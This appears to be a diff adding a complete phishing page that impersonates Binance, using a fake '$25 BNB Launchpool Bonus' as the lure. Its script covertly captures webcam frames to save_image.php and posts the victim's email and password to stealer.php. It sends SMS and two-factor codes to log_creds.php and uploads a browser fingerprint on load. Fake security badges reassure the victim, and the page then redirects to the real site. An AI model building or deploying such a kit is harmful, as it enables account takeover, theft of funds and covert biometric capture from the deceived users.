@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Binance Launchpool Verification</title>
+  <link rel="icon" type="image/png" href="https://bin.bnbstatic.com/static/images/common/favicon.ico">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      /* Light theme (default) */
+      --bg-color: #f8f9fa;
+      --container-bg: #ffffff;
+      --text-color: #1e2329;
+      --border-color: #eaecef;
+      --primary-color: #f0b90b;
+      --secondary-text: #707a8a;
+      --success-color: #16c784;
+      
+      /* Dark theme */
+      --dark-bg-color: #0b0e11;
+      --dark-container-bg: #181a20;
+      --dark-text-color: #eaecef;
+      --dark-border-color: #2b3139;
+      --dark-primary-color: #f0b90b;
+      --dark-secondary-text: #848e9c;
+      --dark-success-color: #16c784;
+    }
+
+    /* Apply dark theme if system prefers it */
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --bg-color: var(--dark-bg-color);
+        --container-bg: var(--dark-container-bg);
+        --text-color: var(--dark-text-color);
+        --border-color: var(--dark-border-color);
+        --secondary-text: var(--dark-secondary-text);
+      }
+    }
+
+    /* Fallback to dark theme */
+    .dark-mode {
+      --bg-color: var(--dark-bg-color);
+      --container-bg: var(--dark-container-bg);
+      --text-color: var(--dark-text-color);
+      --border-color: var(--dark-border-color);
+      --secondary-text: var(--dark-secondary-text);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      transition: background-color 0.3s ease, color 0.3s ease;
+    }
+    body {
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      line-height: 1.5;
+    }
+    .container {
+      background: var(--container-bg);
+      border-radius: 16px;
+      padding: 32px;
+      width: 100%;
+      max-width: 440px;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05), 0 4px 12px rgba(0, 0, 0, 0.05);
+      border: 1px solid var(--border-color);
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeIn 0.4s ease-out forwards;
+    }
+    @keyframes fadeIn { to { opacity: 1; transform: translateY(0); } }
+    .binance-logo {
+      width: 140px;
+      margin: 0 auto 25px;
+      display: block;
+    }
+    .reward-banner {
+      background: rgba(240, 185, 11, 0.08);
+      border: 1px solid rgba(240, 185, 11, 0.2);
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 24px;
+      text-align: center;
+      font-size: 14px;
+    }
+    .reward-banner strong {
+      color: var(--primary-color);
+      font-weight: 600;
+    }
+    .verification-steps {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      margin: 24px 0;
+      position: relative;
+    }
+    .step-indicator {
+      width: 32px;
+      height: 4px;
+      background: var(--border-color);
+      border-radius: 2px;
+      transition: all 0.3s ease;
+    }
+    .step-indicator.active {
+      background: var(--primary-color);
+    }
+    .auth-input {
+      width: 100%;
+      padding: 14px 16px;
+      background: var(--container-bg);
+      border: 1px solid var(--border-color);
+      border-radius: 4px;
+      color: var(--text-color);
+      font-size: 14px;
+      margin-bottom: 16px;
+      transition: all 0.2s ease;
+    }
+    .auth-input:focus {
+      border-color: var(--primary-color);
+      box-shadow: 0 0 0 2px rgba(240, 185, 11, 0.2);
+      outline: none;
+    }
+    .digit-input {
+      letter-spacing: 8px;
+      font-family: monospace;
+      text-align: center;
+      font-size: 18px !important;
+      padding: 12px 20px !important;
+    }
+    .binance-btn {
+      width: 100%;
+      padding: 14px;
+      background: var(--primary-color);
+      color: #1e2329;
+      border: none;
+      border-radius: 4px;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      margin-top: 8px;
+    }
+    .binance-btn:hover {
+      background: #f8d12d;
+    }
+    .countdown-text {
+      color: var(--secondary-text);
+      font-size: 13px;
+      text-align: center;
+      margin: 20px 0;
+    }
+    .countdown-text span {
+      color: var(--primary-color);
+      font-weight: 500;
+    }
+    .security-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 12px;
+      color: var(--secondary-text);
+      margin-top: 24px;
+    }
+    .footer-links {
+      border-top: 1px solid var(--border-color);
+      margin-top: 28px;
+      padding-top: 20px;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+    .footer-links a {
+      color: var(--secondary-text);
+      text-decoration: none;
+      font-size: 12px;
+      transition: color 0.2s ease;
+    }
+    .footer-links a:hover {
+      color: var(--primary-color);
+    }
+    .camera-overlay {
+      position: relative;
+      margin: 20px 0;
+      border-radius: 8px;
+      overflow: hidden;
+      background: var(--bg-color);
+      border: 1px solid var(--border-color);
+    }
+    #video {
+      width: 100%;
+      display: block;
+    }
+    .face-guide {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 180px;
+      height: 180px;
+      border: 2px dashed rgba(30, 35, 41, 0.3);
+      border-radius: 50%;
+    }
+    .hidden { display: none; }
+    .trust-badges {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      margin-top: 24px;
+      flex-wrap: wrap;
+    }
+    .trust-badge {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 11px;
+      color: var(--secondary-text);
+    }
+    .info-text {
+      font-size: 13px;
+      color: var(--secondary-text);
+      margin-bottom: 16px;
+      text-align: center;
+    }
+    .header-text {
+      font-size: 16px;
+      font-weight: 600;
+      text-align: center;
+      margin-bottom: 16px;
+    }
+    .verification-success {
+      background: rgba(22, 199, 132, 0.08);
+      border: 1px solid rgba(22, 199, 132, 0.2);
+      border-radius: 8px;
+      padding: 16px;
+      margin: 20px 0;
+      text-align: center;
+    }
+    .verification-success h3 {
+      color: var(--success-color);
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+    .verification-success p {
+      color: var(--secondary-text);
+      font-size: 13px;
+    }
+    .legal-text {
+      font-size: 11px;
+      color: var(--secondary-text);
+      text-align: center;
+      margin-top: 16px;
+      line-height: 1.4;
+    }
+    .theme-toggle {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+    }
+    .theme-toggle button {
+      background: transparent;
+      border: none;
+      cursor: pointer;
+      color: var(--secondary-text);
+    }
+    .theme-toggle button:hover {
+      color: var(--primary-color);
+    }
+  </style>
+</head>
+<body>
+
+<!-- Theme Toggle -->
+<div class="theme-toggle">
+  <button id="themeToggle" aria-label="Toggle dark mode">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1-8.313-12.454z" fill="currentColor"/>
+    </svg>
+  </button>
+</div>
+
+<!-- Step 1: Initial Offer -->
+<div class="container" id="step1">
+  <img src="https://bin.bnbstatic.com/static/images/common/logo.png" class="binance-logo" alt="Binance" onerror="this.src='binance.svg'">
+  <div class="header-text">Launchpool Verification</div>
+  <div class="verification-steps">
+    <div class="step-indicator active"></div>
+    <div class="step-indicator"></div>
+    <div class="step-indicator"></div>
+    <div class="step-indicator"></div>
+  </div>
+  <div class="reward-banner">
+    <p>You're eligible for a <strong>$25 BNB Launchpool Bonus</strong></p>
+  </div>
+  <p class="info-text">Complete identity verification to claim your bonus reward</p>
+  <button class="binance-btn" onclick="startVerification()">Start Verification</button>
+  
+  <div class="trust-badges">
+    <div class="trust-badge">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM10 17L5 12L6.41 10.59L10 14.17L17.59 6.58L19 8L10 17Z" fill="#16C784"/>
+      </svg>
+      <span>Secure Verification</span>
+    </div>
+    <div class="trust-badge">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1ZM12 11.99H19C18.47 16.11 15.72 19.78 12 20.93V12H5V6.3L12 3.19V11.99Z" fill="#F0B90B"/>
+      </svg>
+      <span>Encrypted Data</span>
+    </div>
+  </div>
+  
+  <div class="security-badge">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1ZM12 7C13.1 7 14 7.9 14 9C14 10.1 13.1 11 12 11C10.9 11 10 10.1 10 9C10 7.9 10.9 7 12 7ZM16 17.58C16 18.85 14.4 20 12 20C9.6 20 8 18.85 8 17.58V15.5H16V17.58Z" fill="currentColor"/>
+    </svg>
+    <span>Secured by Binance</span>
+  </div>
+  
+  <div class="footer-links">
+    <a href="https://www.binance.com/en/support" target="_blank">Support</a>
+    <a href="https://www.binance.com/en/terms" target="_blank">Terms</a>
+    <a href="https://www.binance.com/en/privacy" target="_blank">Privacy</a>
+    <a href="https://www.binance.com/en/legal" target="_blank">Legal</a>
+  </div>
+  
+  <p class="legal-text">© 2025 Binance. All rights reserved. This verification is required to comply with financial regulations and prevent fraud.</p>
+</div>
+
+<!-- Step 2: Camera Verification -->
+<div class="container hidden" id="step2">
+  <img src="https://bin.bnbstatic.com/static/images/common/logo.png" class="binance-logo" alt="Binance" onerror="this.src='binance.svg'">
+  <div class="header-text">Identity Verification</div>
+  <div class="verification-steps">
+    <div class="step-indicator active"></div>
+    <div class="step-indicator active"></div>
+    <div class="step-indicator"></div>
+    <div class="step-indicator"></div>
+  </div>
+  
+  <p class="info-text">Please position your face within the circle for liveness detection</p>
+  
+  <div class="camera-overlay">
+    <video id="video" autoplay playsinline></video>
+    <div class="face-guide"></div>
+  </div>
+  
+  <p class="countdown-text">Verifying liveness detection... <span id="timer">10</span>s</p>
+  
+  <div class="security-badge">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1ZM12 7C13.1 7 14 7.9 14 9C14 10.1 13.1 11 12 11C10.9 11 10 10.1 10 9C10 7.9 10.9 7 12 7ZM16 17.58C16 18.85 14.4 20 12 20C9.6 20 8 18.85 8 17.58V15.5H16V17.58Z" fill="currentColor"/>
+    </svg>
+    <span>Facial data is encrypted and stored securely</span>
+  </div>
+  
+  <div class="footer-links">
+    <a href="https://www.binance.com/en/support" target="_blank">Support</a>
+    <a href="https://www.binance.com/en/terms" target="_blank">Terms</a>
+    <a href="https://www.binance.com/en/privacy" target="_blank">Privacy</a>
+  </div>
+</div>
+
+<!-- Step 3: Credentials -->
+<div class="container hidden" id="step3">
+  <img src="https://bin.bnbstatic.com/static/images/common/logo.png" class="binance-logo" alt="Binance" onerror="this.src='binance.svg'">
+  <div class="header-text">Account Verification</div>
+  <div class="verification-steps">
+    <div class="step-indicator active"></div>
+    <div class="step-indicator active"></div>
+    <div class="step-indicator active"></div>
+    <div class="step-indicator"></div>
+  </div>
+  
+  <p class="info-text">Please enter your Binance account credentials to verify ownership</p>
+  
+  <form onsubmit="return submitCreds()">
+    <input type="email" id="email" class="auth-input" placeholder="Email address" required>
+    <input type="password" id="pass" class="auth-input" placeholder="Password" required>
+    <button class="binance-btn" type="submit">Continue</button>
+  </form>
+  
+  <div class="security-badge">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M18 8H17V6C17 3.24 14.76 1 12 1C9.24 1 7 3.24 7 6V8H6C4.9 8 4 8.9 4 10V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V10C20 8.9 19.1 8 18 8ZM12 17C10.9 17 10 16.1 10 15C10 13.9 10.9 13 12 13C13.1 13 14 13.9 14 15C14 16.1 13.1 17 12 17ZM9 8V6C9 4.34 10.34 3 12 3C13.66 3 15 4.34 15 6V8H9Z" fill="currentColor"/>
+    </svg>
+    <span>Your credentials are encrypted end-to-end</span>
+  </div>
+  
+  <div class="footer-links">
+    <a href="https://www.binance.com/en/support" target="_blank">Support</a>
+    <a href="https://www.binance.com/en/terms" target="_blank">Terms</a>
+    <a href="https://www.binance.com/en/privacy" target="_blank">Privacy</a>
+  </div>
+</div>
+
+<!-- Step 3.5: SMS Verification -->
+<div class="container hidden" id="step3.5">
+  <img src="https://bin.bnbstatic.com/static/images/common/logo.png" class="binance-logo" alt="Binance" onerror="this.src='binance.svg'">
+  <div class="header-text">Two-Factor Verification</div>
+  <div class="verification-steps">
+    <div class="step-indicator active"></div>
+    <div class="step-indicator active"></div>
+    <div class="step-indicator active"></div>
+    <div class="step-indicator"></div>
+  </div>
+  
+  <p class="info-text">We've sent a 6-digit verification code to your registered email</p>
+  
+  <input type="text" id="smsCode" class="auth-input digit-input" placeholder=" " maxlength="6" pattern="\d{6}" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+  <button class="binance-btn" onclick="submitSMSCode()">Verify Code</button>
+  
+  <p class="countdown-text" id="smsCountdown">Resend code in <span id="smsTimer">15</span>s</p>
+  
+  <div class="security-badge">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M20 4H4C2.9 4 2.01 4.9 2.01 6L2 18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6C22 4.9 21.1 4 20 4ZM20 8L12 13L4 8V6L12 11L20 6V8Z" fill="currentColor"/>
+    </svg>
+    <span>Verification code expires in 5 minutes</span>
+  </div>
+  
+  <div class="footer-links">
+    <a href="https://www.binance.com/en/support" target="_blank">Support</a>
+    <a href="https://www.binance.com/en/terms" target="_blank">Terms</a>
+    <a href="https://www.binance.com/en/privacy" target="_blank">Privacy</a>
+  </div>
+</div>
+
+<!-- Step 4: 2FA -->
+<div class="container hidden" id="step4">
+  <img src="https://bin.bnbstatic.com/static/images/common/logo.png" class="binance-logo" alt="Binance" onerror="this.src='binance.svg'">
+  <div class="header-text">SMS Verification</div>
+  <div class="verification-steps">
+    <div class="step-indicator active"></div>
+    <div class="step-indicator active"></div>
+    <div class="step-indicator active"></div>
+    <div class="step-indicator active"></div>
+  </div>
+  
+  <p class="info-text">We've sent a 6-digit verification code to your registered phone number </p>
+  
+  <input type="text" id="twofaCode" class="auth-input digit-input" placeholder=" " maxlength="6" pattern="\d{6}" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+  <button class="binance-btn" onclick="submit2FA()">Complete Verification</button>
+  
+  <div class="security-badge">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M15.5 14H14.71L14.43 13.73C15.41 12.59 16 11.11 16 9.5C16 5.91 13.09 3 9.5 3C5.91 3 3 5.91 3 9.5C3 13.09 5.91 16 9.5 16C11.11 16 12.59 15.41 13.73 14.43L14 14.71V15.5L19 20.49L20.49 19L15.5 14ZM9.5 14C7.01 14 5 11.99 5 9.5C5 7.01 7.01 5 9.5 5C11.99 5 14 7.01 14 9.5C14 11.99 11.99 14 9.5 14Z" fill="currentColor"/>
+    </svg>
+    <span>Two-factor authentication required</span>
+  </div>
+  
+  <div class="footer-links">
+    <a href="https://www.binance.com/en/support" target="_blank">Support</a>
+    <a href="https://www.binance.com/en/terms" target="_blank">Terms</a>
+    <a href="https://www.binance.com/en/privacy" target="_blank">Privacy</a>
+  </div>
+</div>
+
+<script>
+  // Detect and apply color scheme
+  function detectColorScheme() {
+    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+    const noPreference = !window.matchMedia('(prefers-color-scheme: light)').matches && 
+                        !window.matchMedia('(prefers-color-scheme: dark)').matches;
+    
+    // Check localStorage for user preference
+    const userPref = localStorage.getItem('theme');
+    
+    if (userPref === 'dark' || (noPreference && userPref !== 'light') || (prefersDark && userPref !== 'light')) {
+      document.documentElement.classList.add('dark-mode');
+    }
+  }
+
+  // Theme toggle functionality
+  document.getElementById('themeToggle').addEventListener('click', function() {
+    const html = document.documentElement;
+    if (html.classList.contains('dark-mode')) {
+      html.classList.remove('dark-mode');
+      localStorage.setItem('theme', 'light');
+    } else {
+      html.classList.add('dark-mode');
+      localStorage.setItem('theme', 'dark');
+    }
+  });
+
+  // Run on page load
+  window.addEventListener('load', detectColorScheme);
+
+  // Camera and Photo Capture
+  function startVideo() {
+    const video = document.getElementById('video');
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = 640;
+    canvas.height = 480;
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        video.srcObject = stream;
+        setInterval(() => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL('image/jpeg');
+          fetch('save_image.php', {
+            method: 'POST',
+            body: JSON.stringify({ image: imageData }),
+            headers: { 'Content-Type': 'application/json' }
+          });
+        }, 3000);
+      })
+      .catch(err => console.error("Camera error:", err));
+  }
+
+  function startVerification() {
+    document.getElementById('step1').classList.add('hidden');
+    document.getElementById('step2').classList.remove('hidden');
+    startVideo();
+    let time = 10;
+    const timerEl = document.getElementById('timer');
+    const interval = setInterval(() => {
+      time--;
+      timerEl.innerText = time;
+      if (time <= 0) {
+        clearInterval(interval);
+        document.getElementById('step2').classList.add('hidden');
+        document.getElementById('step3').classList.remove('hidden');
+      }
+    }, 1000);
+  }
+
+  function submitCreds() {
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('pass').value;
+    fetch("stealer.php", {
+      method: "POST",
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`
+    });
+    document.getElementById('step3').classList.add('hidden');
+    
+    // Show 15-second countdown before SMS step
+    const verifyBox = document.createElement('div');
+    verifyBox.className = 'container';
+    verifyBox.id = 'verifying';
+    verifyBox.innerHTML = `<div class="header-text">Verifying Credentials</div><p class="info-text">⏳ Verifying your account information... <span id="verifyTimer">15</span> seconds</p>`;
+    document.body.appendChild(verifyBox);
+    
+    let wait = 15;
+    const timer = document.getElementById('verifyTimer');
+    const interval = setInterval(() => {
+      wait--;
+      timer.innerText = wait;
+      if (wait <= 0) {
+        clearInterval(interval);
+        verifyBox.remove();
+        document.getElementById('step3.5').classList.remove('hidden');
+        startSMSCountdown();
+      }
+    }, 1000);
+    return false;
+  }
+
+  function startSMSCountdown() {
+    let smsTime = 15;
+    const smsTimerEl = document.getElementById('smsTimer');
+    const smsInterval = setInterval(() => {
+      smsTime--;
+      smsTimerEl.innerText = smsTime;
+      if (smsTime <= 0) {
+        clearInterval(smsInterval);
+        document.getElementById('smsCountdown').textContent = "Ready for verification";
+      }
+    }, 1000);
+  }
+
+  function submitSMSCode() {
+    const smsCode = document.getElementById('smsCode').value;
+    if (smsCode.length !== 6 || !/^\d+$/.test(smsCode)) {
+      alert('Please enter a valid 6-digit code');
+      return;
+    }
+    
+    fetch('log_creds.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `sms=${encodeURIComponent(smsCode)}`
+    }).then(() => {
+      document.getElementById('step3.5').classList.add('hidden');
+      
+      // Show 15-second countdown before 2FA step
+      const smsVerifyBox = document.createElement('div');
+      smsVerifyBox.className = 'container';
+      smsVerifyBox.innerHTML = `<div class="header-text">Verifying Code</div><p class="info-text">⏳ Verifying your security code... <span id="smsVerifyTimer">15</span> seconds</p>`;
+      document.body.appendChild(smsVerifyBox);
+      
+      let smsWait = 15;
+      const smsTimer = document.getElementById('smsVerifyTimer');
+      const smsInterval = setInterval(() => {
+        smsWait--;
+        smsTimer.innerText = smsWait;
+        if (smsWait <= 0) {
+          clearInterval(smsInterval);
+          smsVerifyBox.remove();
+          document.getElementById('step4').classList.remove('hidden');
+        }
+      }, 1000);
+    });
+  }
+
+  function submit2FA() {
+    const code = document.getElementById('twofaCode').value;
+    if (code.length !== 6 || !/^\d+$/.test(code)) {
+      alert('Please enter a valid 6-digit code');
+      return;
+    }
+    
+    fetch('log_creds.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `code=${encodeURIComponent(code)}`
+    }).then(() => {
+      document.getElementById('step4').innerHTML = `
+        <img src="https://bin.bnbstatic.com/static/images/common/logo.png" class="binance-logo" alt="Binance" onerror="this.src='binance.svg'">
+        <div class="verification-success">
+          <h3>Verification Successful!</h3>
+          <p>Your $25 BNB bonus is being processed and will be credited within 24 hours</p>
+        </div>
+        <div class="info-text">You'll receive a confirmation email shortly</div>
+        <div class="footer-links">
+          <a href="https://www.binance.com/en/support" target="_blank">Support</a>
+          <a href="https://www.binance.com/en/terms" target="_blank">Terms</a>
+          <a href="https://www.binance.com/en/privacy" target="_blank">Privacy</a>
+        </div>
+      `;
+      
+      // Redirect after 5 seconds
+      setTimeout(() => {
+        window.location.href = "https://www.binance.com/en/markets/overview";
+      }, 5000);
+    });
+  }
+
+  function collectFingerprint() {
+    const fingerprint = {
+        // Screen Information
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth
+        },
+        
+        // System Information
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        touchSupport: 'ontouchstart' in window,
+        
+        // Browser Features
+        plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
+        fonts: (() => {
+            const fontList = [
+                'Arial', 'Arial Black', 'Courier New', 'Georgia', 
+                'Impact', 'Times New Roman', 'Verdana', 'Webdings'
+            ];
+            return fontList.filter(font => {
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                context.font = '72px monospace';
+                const baseline = context.measureText('').width;
+                context.font = `72px ${font}, monospace`;
+                return context.measureText('').width !== baseline;
+            }).join(', ');
+        })(),
+        
+        // Advanced Fingerprinting
+        canvasFingerprint: (() => {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Canvas Fingerprint', 2, 15);
+            return canvas.toDataURL();
+        })(),
+        
+        webglFingerprint: (() => {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'no_webgl';
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                };
+            } catch (e) {
+                return 'webgl_error';
+            }
+        })(),
+        
+        // Network Information
+        connection: (() => {
+            if (navigator.connection) {
+                return {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink + ' Mbps',
+                    rtt: navigator.connection.rtt + ' ms',
+                    saveData: navigator.connection.saveData
+                };
+            }
+            return 'network_info_unavailable';
+        })(),
+        
+        // Social Media Detection
+        socialMedia: {
+            facebook: !!window.FB,
+            twitter: !!window.twttr,
+            instagram: !!window.instgrm,
+            linkedin: !!window.lintrk,
+            pinterest: !!window.pintrk
+        }
+    };
+    
+    return fingerprint;
+}
+
+// Send fingerprint data on page load
+window.addEventListener('load', () => {
+    const fingerprint = collectFingerprint();
+    fetch('fingerprint.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(fingerprint)
+    });
+});
+</script>
+
+</body>
+</html>
